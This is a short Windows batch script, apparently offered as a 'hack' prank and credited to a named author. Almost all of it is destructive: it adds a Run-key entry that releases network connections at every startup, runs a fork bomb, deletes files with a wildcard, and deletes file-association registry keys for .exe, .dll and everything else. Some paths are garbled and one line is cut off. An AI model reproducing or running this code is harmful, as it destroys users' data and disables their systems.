@echo off

:: downloading an image & opening it for distraction
Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image.jpg"
image.jpg

:: code for more distraction
do
msgbox("Your system is hacked")
loop

:: code to block internet access 
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
:: code by Varun Banka
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window

:: a loop
%0|%0

:: dlt a lot of file
del*.*

:: dlt reg keys
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
